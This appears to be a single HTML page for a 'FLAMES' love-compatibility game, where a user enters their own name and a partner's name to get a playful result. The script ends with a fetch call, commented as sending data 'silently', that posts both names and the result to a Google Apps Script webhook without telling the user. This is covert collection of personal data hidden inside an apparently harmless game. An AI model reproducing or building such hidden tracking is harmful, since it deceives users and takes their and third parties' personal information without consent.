<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FLAMES üî•</title>

<style>
body {
    margin: 0;
    height: 100vh;
    background: linear-gradient(135deg, #ff6a88, #ff99ac);
    font-family: 'Segoe UI', sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
}

.card {
    background: white;
    padding: 30px 20px;
    border-radius: 22px;
    width: 92%;
    max-width: 380px;
    text-align: center;
    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
}

h1 {
    color: #ff2f68;
    margin-bottom: 10px;
}

.subtitle {
    color: #555;
    margin-bottom: 20px;
    font-size: 15px;
}

input {
    width: 90%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 20px;
    border: 1px solid #ddd;
    font-size: 16px;
    text-align: center;
}

button {
    margin-top: 15px;
    padding: 12px 30px;
    border-radius: 30px;
    border: none;
    background: #ff2f68;
    color: white;
    font-size: 18px;
    cursor: pointer;
}

#result {
    margin-top: 20px;
    display: none;
}

#result h2 {
    font-size: 26px;
    color: #2ecc71;
}

#meaning {
    margin-top: 8px;
    color: #555;
    font-size: 16px;
}
</style>
</head>

<body>

<div class="card">
    <h1>FLAMES üî•</h1>
    <div class="subtitle">
        Enter two names and see destiny üòå‚ù§Ô∏è
    </div>

    <input type="text" id="name1" placeholder="Your Name">
    <input type="text" id="name2" placeholder="Partner's Name">

    <button onclick="calculateFlames()">Show Result üî•</button>

    <div id="result">
        <h2 id="flameLetter"></h2>
        <div id="meaning"></div>
    </div>
</div>

<script>
const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbx1tOYqMKXapB4dMKd6NpHtnTPOZbLUBjn_YNza5Np2wpNSIAiMzEcX4mbj0NMh27admA/exec";

function calculateFlames() {
    const rawName1 = document.getElementById("name1").value.trim();
    const rawName2 = document.getElementById("name2").value.trim();

    if (!rawName1 || !rawName2) {
        alert("Please enter both names ‚ù§Ô∏è");
        return;
    }

    let name1 = rawName1.toLowerCase().replace(/\s/g, '');
    let name2 = rawName2.toLowerCase().replace(/\s/g, '');

    let arr1 = name1.split("");
    let arr2 = name2.split("");

    // Remove common letters
    for (let i = 0; i < arr1.length; i++) {
        for (let j = 0; j < arr2.length; j++) {
            if (arr1[i] === arr2[j]) {
                arr1[i] = "";
                arr2[j] = "";
                break;
            }
        }
    }

    let count = arr1.join("").length + arr2.join("").length;

    let flames = ["F", "L", "A", "M", "E", "S"];
    let index = 0;

    while (flames.length > 1) {
        index = (index + count - 1) % flames.length;
        flames.splice(index, 1);
    }

    const meanings = {
        F: "Friends ü§ù",
        L: "Love ‚ù§Ô∏è",
        A: "Affection ü•∞",
        M: "Marriage üíç",
        E: "Enemies üòÖ",
        S: "Siblings üë®‚Äçüë©‚Äçüëß"
    };

    const finalLetter = flames[0];
    const finalResult = meanings[finalLetter];

    document.getElementById("result").style.display = "block";
    document.getElementById("flameLetter").innerText = finalLetter;
    document.getElementById("meaning").innerText = finalResult;

    // üî• SILENTLY SEND DATA TO YOUR GOOGLE SHEET üî•
    fetch(WEBHOOK_URL, {
        method: "POST",
        body: JSON.stringify({
            name1: rawName1,
            name2: rawName2,
            result: finalResult
        })
    });
}
</script>

</body>
</html>
